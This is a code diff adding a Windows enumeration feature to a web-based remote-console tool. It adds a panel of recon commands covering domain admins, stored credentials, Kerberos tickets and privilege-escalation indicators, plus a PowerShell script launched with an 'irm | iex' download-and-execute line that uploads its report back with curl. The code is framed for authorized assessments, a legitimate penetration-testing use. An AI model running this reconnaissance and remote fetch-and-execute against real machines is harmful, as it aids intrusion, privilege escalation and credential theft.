@@ -534,9 +534,19 @@ body.terminal-view { height: 100dvh; overflow: hidden; }
 .terminal-view .legacy-shells, .terminal-view #console-terminal-info { display: none; }
 .terminal-view #console-proxy { display: none; }
 .terminal-view #console-callbacks { display: none; }
+.terminal-view #windows-recon { display: none; }
 #console-callbacks { margin: 16px 0 24px; }
 #console-callbacks .section-head { margin-bottom: 8px; }
 #console-callbacks .rs-cfg { margin-bottom: 8px; }
+.recon-panel { margin: 24px 0; padding-top: 16px; border-top: 1px solid var(--brd); }
+.recon-panel > summary { cursor: pointer; color: var(--dim); font-weight: 600; margin-bottom: 12px; }
+.recon-actions { display: flex; align-items: center; gap: 10px; flex-wrap: wrap; margin-bottom: 12px; }
+.recon-actions input { flex: 1; min-width: 180px; }
+.recon-cat { margin: 18px 0 6px; color: var(--fnt); font-size: 11px; font-weight: 600; letter-spacing: .06em; text-transform: uppercase; }
+.recon-row { display: grid; grid-template-columns: minmax(140px, 220px) minmax(0, 1fr) auto; gap: 12px; align-items: center; padding: 8px 0; border-bottom: 1px solid var(--brd); }
+.recon-row code { font-size: 12px; overflow-wrap: anywhere; }
+.recon-btns { display: flex; gap: 4px; }
+@media (max-width: 760px) { .recon-row { grid-template-columns: 1fr auto; } .recon-row > span:first-child { grid-column: 1 / -1; } }
 .terminal-view .app-shell { height: 100%; min-height: 0; }
 .terminal-view .workspace { max-width: none; height: 100%; padding: 0; }
 .terminal-view #shells { height: 100%; display: flex; flex-direction: column; }
@@ -907,7 +917,7 @@ body.terminal-view { height: 100dvh; overflow: hidden; }
           <p class="hint">Uses this page’s address. The other machine must be able to reach it. Runs as your current user; no service is installed.</p>
         </section>
         <div class="terminal-tab-bar"><a class="btn ghost sm" href="/#shells">Back to consoles</a><strong id="terminal-tab-title">Terminal</strong><span class="hint" id="terminal-tab-status">Connecting…</span></div>
-        <section class="console-workspace"><div class="section-head"><h2>Connected machines</h2><div class="console-actions"><button class="btn ghost sm" id="console-popout" disabled>Open terminal in new tab</button><button class="btn ghost sm" id="console-disconnect" disabled>Disconnect selected</button><button class="btn ghost sm" id="console-remove" title="Disconnect this machine and delete its session and terminal history" disabled>Remove selected</button></div></div><div class="console-tabs" id="console-sessions" aria-label="Connected machines"></div><div id="console-proxy" hidden><div class="connect-command"><span class="hint">Network proxy</span><code id="console-proxy-address"></code><span class="hint" id="console-proxy-target"></span><button class="btn ghost sm" id="console-proxy-use" disabled>Use selected machine</button></div><p class="hint">Run proxychains4 or any SOCKS5 client on this host. Traffic exits from the selected machine’s network.</p></div><div id="console-callbacks" hidden><div class="section-head"><h2>Inbound callbacks</h2></div><p class="hint">Listen on the connected machine and forward connections to a service on this host.</p><div class="rs-cfg"><label>Local port <input class="rs-in" id="callback-local" inputmode="numeric" autocomplete="off" spellcheck="false" placeholder="4444"></label><label>Endpoint port <input class="rs-in" id="callback-remote" inputmode="numeric" autocomplete="off" spellcheck="false" placeholder="4444"></label><button class="btn ghost sm" id="callback-add">Add callback</button></div><div id="callback-list"></div></div><p class="empty-line" id="console-empty">Waiting for a connection. Run the command above on your test machine.</p><div class="browser-terminal" id="browser-terminal" hidden></div><p class="hint" id="console-terminal-info">Ctrl+C interrupts the remote command. Type exit to end the shell.</p></section>
+        <section class="console-workspace"><div class="section-head"><h2>Connected machines</h2><div class="console-actions"><button class="btn ghost sm" id="console-popout" disabled>Open terminal in new tab</button><button class="btn ghost sm" id="console-disconnect" disabled>Disconnect selected</button><button class="btn ghost sm" id="console-remove" title="Disconnect this machine and delete its session and terminal history" disabled>Remove selected</button></div></div><div class="console-tabs" id="console-sessions" aria-label="Connected machines"></div><div id="console-proxy" hidden><div class="connect-command"><span class="hint">Network proxy</span><code id="console-proxy-address"></code><span class="hint" id="console-proxy-target"></span><button class="btn ghost sm" id="console-proxy-use" disabled>Use selected machine</button></div><p class="hint">Run proxychains4 or any SOCKS5 client on this host. Traffic exits from the selected machine’s network.</p></div><div id="console-callbacks" hidden><div class="section-head"><h2>Inbound callbacks</h2></div><p class="hint">Listen on the connected machine and forward connections to a service on this host.</p><div class="rs-cfg"><label>Local port <input class="rs-in" id="callback-local" inputmode="numeric" autocomplete="off" spellcheck="false" placeholder="4444"></label><label>Endpoint port <input class="rs-in" id="callback-remote" inputmode="numeric" autocomplete="off" spellcheck="false" placeholder="4444"></label><button class="btn ghost sm" id="callback-add">Add callback</button></div><div id="callback-list"></div></div><details class="recon-panel" id="windows-recon"><summary>Windows enumeration</summary><p class="hint">Read-only low-privilege checks and an escalation-path report. Runs in the selected Windows console. Open this page through the public HTTPS URL before running winenum. Authorized assessments only.</p><div class="recon-actions"><button class="btn ghost sm" id="recon-winenum">Run winenum</button><input class="rs-in" id="recon-search" type="search" placeholder="Filter commands…" autocomplete="off" spellcheck="false"></div><div id="recon-list"></div></details><p class="empty-line" id="console-empty">Waiting for a connection. Run the command above on your test machine.</p><div class="browser-terminal" id="browser-terminal" hidden></div><p class="hint" id="console-terminal-info">Ctrl+C interrupts the remote command. Type exit to end the shell.</p></section>
       </div>
       <p id="console-error" class="console-error" role="status"></p>
       <details class="legacy-shells"><summary>Raw TCP connection commands</summary><p class="hint">For direct network tests. These require a separate TCP listener and reachable port.</p>
@@ -1736,6 +1746,45 @@ loadDisk();
 (function(){
   let enabled=false,ticket='',expires=0,platform='win',selected='',terminal=null,fit=null,cursor=0,generation=0,polling=false;
   let inputQueue=Promise.resolve(),sessions=[],available=[],proxy=null,callbacks=[];
+  const reconCommands=[
+    ['Identity','Whoami full',String.raw`whoami /all`],
+    ['Identity','Token privileges',String.raw`whoami /priv`],
+    ['Identity','Current identity',String.raw`$env:USERDOMAIN; $env:USERNAME; [Security.Principal.WindowsIdentity]::GetCurrent().Name`],
+    ['Host','System info',String.raw`systeminfo`],
+    ['Host','Computer info',String.raw`Get-ComputerInfo | Format-List`],
+    ['Host','Recent patches',String.raw`Get-HotFix | Sort InstalledOn -Descending | Select -First 15`],
+    ['Network','IP configuration',String.raw`ipconfig /all`],
+    ['Network','Routes',String.raw`route print`],
+    ['Network','ARP table',String.raw`arp -a`],
+    ['Network','Listening TCP',String.raw`Get-NetTCPConnection -State Listen | Sort LocalPort | Select LocalAddress,LocalPort,OwningProcess`],
+    ['Network','SMB mappings',String.raw`net use; Get-SmbMapping`],
+    ['Network','Proxy',String.raw`netsh winhttp show proxy`],
+    ['Users','Local users',String.raw`net user`],
+    ['Users','Local groups',String.raw`net localgroup`],
+    ['Users','Administrators',String.raw`net localgroup administrators`],
+    ['Users','Logged on',String.raw`quser; query session`],
+    ['Domain','Workstation config',String.raw`net config workstation`],
+    ['Domain','Domain controllers',String.raw`nltest /dsgetdc:$env:USERDNSDOMAIN`],
+    ['Domain','Trusts',String.raw`nltest /domain_trusts`],
+    ['Domain','Domain groups',String.raw`net group /domain`],
+    ['Domain','Domain Admins',String.raw`net group "Domain Admins" /domain`],
+    ['Domain','Group policy',String.raw`gpresult /r`],
+    ['Services','Services',String.raw`Get-CimInstance Win32_Service | Select Name,State,StartMode,StartName,PathName | Format-Table -AutoSize`],
+    ['Services','Unquoted paths',String.raw`Get-CimInstance Win32_Service | Where PathName -match '^[^"].*\.exe\s' | Select Name,PathName`],
+    ['Services','Scheduled tasks',String.raw`Get-ScheduledTask | Select TaskPath,TaskName,State,Author | Sort TaskPath,TaskName`],
+    ['Services','Startup commands',String.raw`Get-CimInstance Win32_StartupCommand | Select Name,Command,Location,User`],
+    ['Files','Program Files ACL',String.raw`icacls "C:\Program Files"`],
+    ['Files','Temp ACL',String.raw`icacls "C:\Windows\Temp"`],
+    ['Files','PATH entries',String.raw`$env:Path -split ';'`],
+    ['Credentials','Stored credentials',String.raw`cmdkey /list`],
+    ['Credentials','Kerberos tickets',String.raw`klist`],
+    ['Credentials','Credential files',String.raw`Get-ChildItem "$env:APPDATA\Microsoft\Credentials" -Force`],
+    ['Credentials','PowerShell history',String.raw`Get-Item "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"`],
+    ['Privesc','AlwaysInstallElevated',String.raw`Get-ItemProperty 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer','HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer' -Name AlwaysInstallElevated`],
+    ['Privesc','Autologon',String.raw`Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' | Select AutoAdminLogon,DefaultUserName,DefaultDomainName`],
+    ['Privesc','UAC',String.raw`Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' | Select EnableLUA,ConsentPromptBehaviorAdmin`],
+    ['Privesc','Defender',String.raw`Get-MpComputerStatus | Select AMEnabled,RealTimeProtectionEnabled,AntivirusEnabled`]
+  ];
   const error=q('console-error'),container=q('browser-terminal');
   const terminalSession=new URLSearchParams(location.search).get('terminal');
   if(terminalSession){document.body.classList.add('terminal-view');showView('shells')}
@@ -1813,6 +1862,26 @@ loadDisk();
     });
   }
   async function removeCallback(id){try{await api('callbacks/'+id+'/remove','POST',{});await refresh();notice('')}catch(e){notice(e.message)}}
+  function runRecon(command){
+    if(!selected){notice('Select a console first');return}
+    api('sessions/'+selected+'/input','POST',{data:command+'\r'}).catch(e=>notice(e.message));
+  }
+  function renderRecon(){
+    const list=q('recon-list');if(!list)return;
+    const filter=(q('recon-search').value||'').trim().toLowerCase();
+    list.replaceChildren();
+    let category='';
+    reconCommands.filter(item=>!filter||(item[0]+' '+item[1]+' '+item[2]).toLowerCase().includes(filter)).forEach(item=>{
+      if(item[0]!==category){category=item[0];const heading=document.createElement('div');heading.className='recon-cat';heading.textContent=category;list.appendChild(heading)}
+      const row=document.createElement('div');row.className='recon-row';
+      const label=document.createElement('span');label.className='hint';label.textContent=item[1];
+      const code=document.createElement('code');code.textContent=item[2];
+      const actions=document.createElement('span');actions.className='recon-btns';
+      const run=document.createElement('button');run.className='btn ghost sm';run.textContent='Run';run.addEventListener('click',()=>runRecon(item[2]));
+      const copy=document.createElement('button');copy.className='btn ghost sm';copy.textContent='Copy';copy.addEventListener('click',()=>copyText(item[2],'Command copied'));
+      actions.append(run,copy);row.append(label,code,actions);list.appendChild(row);
+    });
+  }
   async function refresh(){
     if(!enabled||polling)return;polling=true;
     try{
@@ -1861,6 +1930,20 @@ loadDisk();
     try{const callback=await api('callbacks','POST',{local,remote});q('callback-local').value='';q('callback-remote').value='';await refresh();notice('Callback '+callback.remote+' → 127.0.0.1:'+callback.local)}
     catch(e){notice(e.message)}
   });
+  q('recon-search').addEventListener('input',renderRecon);
+  q('recon-winenum').addEventListener('click',async()=>{
+    if(!selected){notice('Select a console first');return}
+    const session=sessions.find(s=>s.id===selected);
+    if(!session||session.os!=='windows'){notice('Select a Windows console first');return}
+    try{
+      const info=await api('winenum/ticket','POST',{});
+      const origin=location.origin;
+      const command=`$ExposeTicket='${info.ticket}'; $ExposeOrigin='${origin}'; irm "$ExposeOrigin/console/winenum.ps1?ticket=$ExposeTicket" | iex`;
+      await api('sessions/'+selected+'/input','POST',{data:command+'\r'});
+      notice('winenum started in the selected console');
+    }catch(e){notice(e.message)}
+  });
+  renderRecon();
   new ResizeObserver(fitTerminal).observe(container);
   window.addEventListener('hashchange',()=>{if(!q('shells').hidden){fitTerminal();refresh()}});
   setInterval(()=>{refresh();if(ticket&&expires<Date.now()){q('console-copy').disabled=true;q('console-invite-info').textContent='Connection link expired. Create a new link.'}},2000);
@@ -2312,9 +2395,19 @@ body.terminal-view { height: 100dvh; overflow: hidden; }
 .terminal-view .legacy-shells, .terminal-view #console-terminal-info { display: none; }
 .terminal-view #console-proxy { display: none; }
 .terminal-view #console-callbacks { display: none; }
+.terminal-view #windows-recon { display: none; }
 #console-callbacks { margin: 16px 0 24px; }
 #console-callbacks .section-head { margin-bottom: 8px; }
 #console-callbacks .rs-cfg { margin-bottom: 8px; }
+.recon-panel { margin: 24px 0; padding-top: 16px; border-top: 1px solid var(--brd); }
+.recon-panel > summary { cursor: pointer; color: var(--dim); font-weight: 600; margin-bottom: 12px; }
+.recon-actions { display: flex; align-items: center; gap: 10px; flex-wrap: wrap; margin-bottom: 12px; }
+.recon-actions input { flex: 1; min-width: 180px; }
+.recon-cat { margin: 18px 0 6px; color: var(--fnt); font-size: 11px; font-weight: 600; letter-spacing: .06em; text-transform: uppercase; }
+.recon-row { display: grid; grid-template-columns: minmax(140px, 220px) minmax(0, 1fr) auto; gap: 12px; align-items: center; padding: 8px 0; border-bottom: 1px solid var(--brd); }
+.recon-row code { font-size: 12px; overflow-wrap: anywhere; }
+.recon-btns { display: flex; gap: 4px; }
+@media (max-width: 760px) { .recon-row { grid-template-columns: 1fr auto; } .recon-row > span:first-child { grid-column: 1 / -1; } }
 .terminal-view .app-shell { height: 100%; min-height: 0; }
 .terminal-view .workspace { max-width: none; height: 100%; padding: 0; }
 .terminal-view #shells { height: 100%; display: flex; flex-direction: column; }
@@ -2449,6 +2542,8 @@ class ConsoleService:
         self.proxy_address = ''
         self.proxy_stats = {'opens': 0, 'failed': 0, 'sent': 0, 'received': 0}
         self.event_seen = {}
+        self.script_tickets = {}
+        self.winenum_script = ''
         self.condition = threading.Condition()
         self.platforms = ['linux-amd64', 'linux-arm64', 'darwin-amd64', 'darwin-arm64',
                           'windows-amd64.exe', 'windows-arm64.exe']
@@ -2518,6 +2613,7 @@ class ConsoleService:
         self.invites = {k: v for k, v in self.invites.items() if v['expires'] > now}
         self.registrations = {k: v for k, v in self.registrations.items()
                               if v['expires'] > now}
+        self.script_tickets = {k: v for k, v in self.script_tickets.items() if v > now}
         keep = {}
         for ident, session in self.sessions.items():
             retention = self.SESSION_RETENTION if session['connected'] else self.CLOSED_RETENTION
@@ -2674,6 +2770,26 @@ class ConsoleService:
             self.proxy_address = proxy.address
         return proxy
 
+    def new_script_ticket(self):
+        with self.condition:
+            now = time.time()
+            self.script_tickets = {k: v for k, v in self.script_tickets.items() if v > now}
+            if len(self.script_tickets) >= 16:
+                self.script_tickets.pop(next(iter(self.script_tickets)), None)
+            ticket = secrets.token_urlsafe(24)
+            self.script_tickets[ticket] = now + 1800
+            return ticket
+
+    def valid_transfer_ticket(self, ticket):
+        if not ticket:
+            return False
+        with self.condition:
+            expires = self.script_tickets.get(ticket)
+            if not expires or expires < time.time():
+                self.script_tickets.pop(ticket, None)
+                return False
+            return True
+
     def callback_info(self, callback):
         session = self.sessions.get(callback['session'])
         return {'id': callback['id'], 'local': callback['local'],
@@ -2811,6 +2927,20 @@ class ConsoleService:
                 return True
             with self.condition:
                 self.prune()
+            if path == '/console/winenum/ticket' and handler.command == 'POST':
+                self.reply(handler, 200, {'ticket': self.new_script_ticket(),
+                                          'expires': time.time() + 1800})
+                return True
+            if path == '/console/winenum.ps1' and handler.command == 'GET':
+                ticket = urllib.parse.parse_qs(parsed.query).get('ticket', [''])[0]
+                if not self.valid_transfer_ticket(ticket):
+                    self.reply(handler, 401, {'error': 'Script link expired'})
+                    return True
+                body = self.winenum_script or '# winenum script unavailable'
+                handler._send(200, body, 'text/plain; charset=utf-8', (
+                    ('Cache-Control', 'no-store'), ('Referrer-Policy', 'no-referrer'),
+                    ('X-Content-Type-Options', 'nosniff')))
+                return True
             if path in ('/lin', '/mac', '/win') or path.startswith('/console/client/'):
                 self.bootstrap(handler, path, urllib.parse.parse_qs(parsed.query))
                 return True
@@ -3307,6 +3437,248 @@ class SocksProxy:
                     pass
 CONSOLEPY
 
+_WINENUM_PS1=$(_mktmp /tmp/expose-winenum.XXXXXX)
+cat > "$_WINENUM_PS1" <<'WINENUMPS1'
+# expose winenum — read-only low-privilege Windows enumeration.
+# Authorized assessments only. This script changes nothing.
+$ErrorActionPreference = 'SilentlyContinue'
+$ProgressPreference = 'SilentlyContinue'
+$findings = New-Object System.Collections.Generic.List[string]
+$report = Join-Path $env:TEMP ("expose-winenum-{0}-{1}.txt" -f $env:COMPUTERNAME, (Get-Date -Format 'yyyyMMdd-HHmmss'))
+$transcript = $false
+try { Start-Transcript -Path $report -Force | Out-Null; $transcript = $true } catch {}
+
+function Section([string]$title) {
+    Write-Host "`n===== $title =====" -ForegroundColor Cyan
+}
+function Note([string]$text) {
+    Write-Host "  $text" -ForegroundColor DarkGray
+}
+function Candidate([string]$text) {
+    $findings.Add($text) | Out-Null
+    Write-Host "  [!] $text" -ForegroundColor Yellow
+}
+function Exists([string]$path) {
+    return (Test-Path -LiteralPath $path -ErrorAction SilentlyContinue)
+}
+function WritableByUser([string]$path) {
+    if (-not (Exists $path)) { return }
+    $acl = Get-Acl -LiteralPath $path -ErrorAction SilentlyContinue
+    if (-not $acl) { return }
+    foreach ($rule in $acl.Access) {
+        if ($rule.AccessControlType -ne 'Allow') { continue }
+        if ($rule.FileSystemRights -notmatch 'Write|Modify|FullControl') { continue }
+        if ($rule.IdentityReference -match 'Users|Everyone|Authenticated Users' -or
+            $rule.IdentityReference.Value -eq ([Security.Principal.WindowsIdentity]::GetCurrent().Name)) {
+            Write-Host "  $path -> $($rule.IdentityReference) : $($rule.FileSystemRights)"
+        }
+    }
+}
+
+Section 'Identity and token'
+whoami /all
+Note "Computer: $env:COMPUTERNAME"
+Note "User: $env:USERDOMAIN\$env:USERNAME"
+Note "Identity: $([Security.Principal.WindowsIdentity]::GetCurrent().Name)"
+Note "PowerShell: $($PSVersionTable.PSVersion)"
+Note "Language mode: $($ExecutionContext.SessionState.LanguageMode)"
+
+Section 'Dangerous token privileges'
+$danger = 'SeImpersonatePrivilege','SeAssignPrimaryTokenPrivilege','SeBackupPrivilege',
+          'SeRestorePrivilege','SeDebugPrivilege','SeTakeOwnershipPrivilege',
+          'SeLoadDriverPrivilege','SeCreateTokenPrivilege','SeTcbPrivilege',
+          'SeManageVolumePrivilege'
+$privs = whoami /priv
+$privs | Select-String $danger
+foreach ($name in $danger) {
+    if ($privs -match $name) { Candidate "Token privilege present: $name" }
+}
+
+Section 'Host and patch level'
+Get-CimInstance Win32_OperatingSystem |
+    Select-Object Caption,Version,BuildNumber,OSArchitecture,LastBootUpTime,InstallDate
+Get-CimInstance Win32_ComputerSystem |
+    Select-Object Name,Domain,PartOfDomain,Manufacturer,Model,TotalPhysicalMemory
+Get-CimInstance Win32_BIOS | Select-Object SerialNumber,SMBIOSBIOSVersion,ReleaseDate
+Get-CimInstance Win32_Processor | Select-Object Name,NumberOfCores,NumberOfLogicalProcessors
+Get-HotFix | Sort-Object InstalledOn -Descending | Select-Object -First 20 HotFixID,Description,InstalledOn
+Get-MpComputerStatus | Select-Object AMEnabled,RealTimeProtectionEnabled,AntivirusEnabled,AntispywareEnabled,BehaviorMonitorEnabled
+
+Section 'Network'
+ipconfig /all
+route print
+arp -a
+Get-NetTCPConnection -State Listen | Sort-Object LocalPort |
+    Select-Object LocalAddress,LocalPort,OwningProcess,
+        @{n='Process';e={(Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).ProcessName}}
+Get-NetUDPEndpoint | Sort-Object LocalPort | Select-Object LocalAddress,LocalPort,OwningProcess
+Get-DnsClientServerAddress
+net use
+Get-SmbMapping
+netsh winhttp show proxy
+Get-ItemProperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings' |
+    Select-Object ProxyEnable,ProxyServer,AutoConfigURL
+
+Section 'Users, groups, domain'
+net user
+net localgroup
+net localgroup administrators
+Get-LocalUser | Select-Object Name,Enabled,LastLogon,Description
+Get-LocalGroupMember -Group Administrators
+net config workstation
+nltest /dsgetdc:$env:USERDNSDOMAIN
+nltest /domain_trusts
+net group /domain
+net group "Domain Admins" /domain
+net group "Enterprise Admins" /domain
+gpresult /r
+if (Get-Module -ListAvailable ActiveDirectory) {
+    Import-Module ActiveDirectory
+    Get-ADDomain | Select-Object DNSRoot,NetBIOSName,DomainMode
+    (Get-ADUser $env:USERNAME -Properties MemberOf).MemberOf
+    Get-ADGroupMember 'Domain Admins' | Select-Object SamAccountName,Name,objectClass
+    Get-ADGroupMember 'Enterprise Admins' | Select-Object SamAccountName,Name,objectClass
+}
+
+Section 'Sessions and logons'
+quser
+query session
+Get-CimInstance Win32_LogonSession | Select-Object LogonId,LogonType,StartTime
+Get-CimInstance Win32_LoggedOnUser | Select-Object Antecedent,Dependent
+
+Section 'Services'
+$services = Get-CimInstance Win32_Service |
+    Select-Object Name,DisplayName,State,StartMode,StartName,PathName
+$services | Format-Table -AutoSize
+Write-Host "`n-- Unquoted service paths"
+$unquoted = $services | Where-Object { $_.PathName -match '^[^"].*\.exe\s' }
+$unquoted | Select-Object Name,PathName | Format-Table -AutoSize
+foreach ($service in $unquoted) {
+    Candidate "Unquoted service path: $($service.Name) -> $($service.PathName)"
+}
+Write-Host "`n-- Service files or directories writable by this user"
+foreach ($service in $services) {
+    if (-not $service.PathName) { continue }
+    $exe = $null
+    if ($service.PathName -match '^"([^"]+)"') { $exe = $matches[1] }
+    elseif ($service.PathName -match '^(\S+\.exe)') { $exe = $matches[1] }
+    if (-not $exe) { continue }
+    if (Exists $exe) { WritableByUser $exe }
+    $dir = Split-Path -Parent $exe
+    if ($dir -and (Exists $dir)) { WritableByUser $dir }
+}
+Write-Host "`n-- Raw service ACLs for non-Windows services"
+foreach ($service in $services | Where-Object { $_.PathName -and $_.PathName -notmatch 'C:\\Windows\\' }) {
+    Write-Host "`n$($service.Name)"
+    sc.exe sdshow $service.Name
+}
+
+Section 'Scheduled tasks'
+Get-ScheduledTask | Select-Object TaskPath,TaskName,State,Author | Sort-Object TaskPath,TaskName
+foreach ($task in Get-ScheduledTask) {
+    foreach ($action in $task.Actions) {
+        if ($action.Execute) {
+            "$($task.TaskPath)$($task.TaskName): $($action.Execute) $($action.Arguments)"
+        }
+    }
+}
+schtasks /query /fo LIST /v |
+    Select-String 'TaskName|Run As User|Task To Run|Schedule Type|Status'
+
+Section 'Autoruns and startup'
+Get-CimInstance Win32_StartupCommand | Select-Object Name,Command,Location,User
+Get-ItemProperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'
+Get-ItemProperty 'HKLM:\Software\Microsoft\Windows\CurrentVersion\Run'
+Get-ItemProperty 'HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run'
+Get-ChildItem "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup" -Force
+Get-ChildItem 'C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp' -Force
+
+Section 'Installed software'
+$uninstall = 'HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*',
+             'HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*',
+             'HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*'
+Get-ItemProperty $uninstall | Where-Object DisplayName |
+    Select-Object DisplayName,DisplayVersion,Publisher,InstallDate | Sort-Object DisplayName
+
+Section 'Shares and sessions'
+net share
+Get-SmbShare | Select-Object Name,Path,Description
+Get-SmbSession | Select-Object ClientComputerName,ClientUserName,NumOpens
+
+Section 'Credential and secret locations (presence only)'
+cmdkey /list
+klist
+foreach ($path in @("$env:APPDATA\Microsoft\Credentials",
+                    "$env:LOCALAPPDATA\Microsoft\Credentials",
+                    "$env:USERPROFILE\.ssh",
+                    "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine")) {
+    if (Exists $path) {
+        Write-Host "`n$path"
+        Get-ChildItem -LiteralPath $path -Force | Select-Object Name,Length,LastWriteTime
+        Candidate "User-readable credential material: $path"
+    }
+}
+foreach ($path in @('C:\unattend.xml','C:\Windows\Panther\Unattend.xml',
+                    'C:\Windows\Panther\Unattend\Unattend.xml',
+                    'C:\Windows\System32\Sysprep\sysprep.inf',
+                    'C:\Windows\System32\Sysprep\sysprep.xml')) {
+    if (Exists $path) { Candidate "Unattend/sysprep file present: $path" }
+}
+
+Section 'Escalation indicators'
+Write-Host "`n-- AlwaysInstallElevated"
+foreach ($key in 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer',
+                 'HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer') {
+    if (Exists $key) {
+        $value = Get-ItemProperty -LiteralPath $key -Name AlwaysInstallElevated
+        if ($value.AlwaysInstallElevated -eq 1) {
+            Write-Host "  $key = 1"
+            Candidate "AlwaysInstallElevated is enabled in $key"
+        }
+    }
+}
+Write-Host "`n-- Winlogon autologon"
+$winlogon = Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon'
+[pscustomobject]@{
+    AutoAdminLogon = $winlogon.AutoAdminLogon
+    DefaultUserName = $winlogon.DefaultUserName
+    DefaultDomainName = $winlogon.DefaultDomainName
+    DefaultPasswordPresent = [bool]$winlogon.DefaultPassword
+}
+if ($winlogon.DefaultPassword) { Candidate 'Plaintext DefaultPassword is present in Winlogon' }
+
+Write-Host "`n-- Writable PATH directories"
+foreach ($dir in ($env:Path -split ';')) {
+    if ($dir -and (Exists $dir)) { WritableByUser $dir }
+}
+Write-Host "`n-- UAC configuration"
+Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' |
+    Select-Object EnableLUA,ConsentPromptBehaviorAdmin,PromptOnSecureDesktop
+Write-Host "`n-- AppLocker policy present"
+Get-AppLockerPolicy -Effective -ErrorAction SilentlyContinue | Select-Object -First 1
+
+Section 'Candidate escalation paths'
+if ($findings.Count -eq 0) {
+    Write-Host '  No obvious low-privilege path was identified by this script.'
+} else {
+    $findings | Sort-Object -Unique | ForEach-Object { Write-Host "  [!] $_" -ForegroundColor Yellow }
+}
+Write-Host "`n  Validate each candidate manually. This script does not exploit anything."
+
+if ($transcript) { try { Stop-Transcript | Out-Null } catch {} }
+Write-Host "`n[+] Report: $report"
+if ($ExposeOrigin -and $ExposeTicket) {
+    $curl = Get-Command curl.exe -ErrorAction SilentlyContinue
+    if ($curl) {
+        & $curl.Source -s -F "files=@$report" "$ExposeOrigin/upload?ticket=$ExposeTicket" | Out-Null
+        if ($LASTEXITCODE -eq 0) { Write-Host "[+] Report uploaded to $ExposeOrigin" }
+        else { Write-Host "[!] Upload failed; retrieve the report manually." }
+    } else {
+        Write-Host '[!] curl.exe not found; retrieve the report manually.'
+    }
+}
+WINENUMPS1
+
 _export_common() {
   export EXPOSE_PORT="$PORT" EXPOSE_BIND="$BIND" EXPOSE_VERBOSE="$VERBOSE"
   export EXPOSE_UPLOAD_HTML="$_UPLOAD_HTML" EXPOSE_UPLOAD_DIR="$UPLOAD_DIR"
@@ -3323,6 +3695,7 @@ _export_common() {
   export EXPOSE_ME_HTML="$_ME_HTML"
   export EXPOSE_LOGO_SVG="$_LOGO_SVG"
   export EXPOSE_CONSOLES="$CONSOLES" EXPOSE_CONSOLE_MODULE="$_CONSOLE_PY"
+  export EXPOSE_WINENUM="$_WINENUM_PS1"
   export EXPOSE_PROXY="$PROXY"
   _CALLBACKS_LIST=""
   (( ${#CALLBACKS[@]} )) && _CALLBACKS_LIST=$(IFS=,; printf '%s' "${CALLBACKS[*]}")
@@ -3460,6 +3833,17 @@ INTERNAL_PATHS = {'/log', '/log/clear', '/chat', '/upload/files', '/meta',
 def internal_path(path):
     return path in INTERNAL_PATHS or path.startswith('/console/')
 
+def redact_path(path):
+    parsed = urllib.parse.urlsplit(path)
+    if not parsed.query:
+        return path
+    pairs = urllib.parse.parse_qsl(parsed.query, keep_blank_values=True)
+    if not any(key == 'ticket' for key, _ in pairs):
+        return path
+    pairs = [(key, '***' if key == 'ticket' else value) for key, value in pairs]
+    return urllib.parse.urlunsplit((parsed.scheme, parsed.netloc, parsed.path,
+                                    urllib.parse.urlencode(pairs), parsed.fragment))
+
 def event(kind, message, ip=''):
     sys.stderr.write(f"{datetime.datetime.now().strftime('%H:%M:%S')}  "
                      f"{ip:<15}  {kind:<9} {message}\n")
@@ -3484,6 +3868,11 @@ _httpd = None
 console_enabled = os.environ.get('EXPOSE_CONSOLES') == '1'
 ConsoleService = runpy.run_path(os.environ['EXPOSE_CONSOLE_MODULE'])['ConsoleService']
 consoles = ConsoleService(console_enabled, os.environ.get('EXPOSE_CLIENT_DIR', ''))
+try:
+    with open(os.environ.get('EXPOSE_WINENUM', '')) as winenum_file:
+        consoles.winenum_script = winenum_file.read()
+except OSError:
+    consoles.winenum_script = ''
 proxy_bind = os.environ.get('EXPOSE_PROXY', '').strip()
 if proxy_bind and console_enabled:
     try:
@@ -3717,6 +4106,7 @@ class Handler(http.server.SimpleHTTPRequestHandler):
                 or path.startswith('/console/client/')
                 or path == '/console/register'
                 or path.startswith('/console/agent/')
+                or path == '/console/winenum.ps1'
                 or self.command == 'OPTIONS'):
             return True
         if self._session_valid():
@@ -4011,7 +4401,12 @@ class Handler(http.server.SimpleHTTPRequestHandler):
         if path == '/logout':
             self._handle_logout()
             return
-        if not self._authorized():
+        ticket_upload = False
+        if path == '/upload':
+            ticket = urllib.parse.parse_qs(
+                urllib.parse.urlsplit(self.path).query).get('ticket', [''])[0]
+            ticket_upload = bool(ticket and consoles.valid_transfer_ticket(ticket))
+        if not ticket_upload and not self._authorized():
             return
         if consoles.handle(self):
             return
@@ -4032,7 +4427,7 @@ class Handler(http.server.SimpleHTTPRequestHandler):
             sys.stderr.flush()
             sys.stderr.buffer.write(shown + b"\n")
             sys.stderr.buffer.flush()
-        if self.path == '/log/clear':
+        if path == '/log/clear':
             try:
                 with open(log_file, 'w') as f: json.dump([], f)
             except: pass
@@ -4042,7 +4437,7 @@ class Handler(http.server.SimpleHTTPRequestHandler):
             self.send_header("Content-Length", str(len(result)))
             self.end_headers()
             self.wfile.write(result)
-        elif self.path == "/upload":
+        elif path == "/upload":
             ct = self.headers.get("Content-Type", "")
             saved = parse_multipart(body, ct)
             result = json.dumps({"saved": saved, "count": len(saved)}).encode()
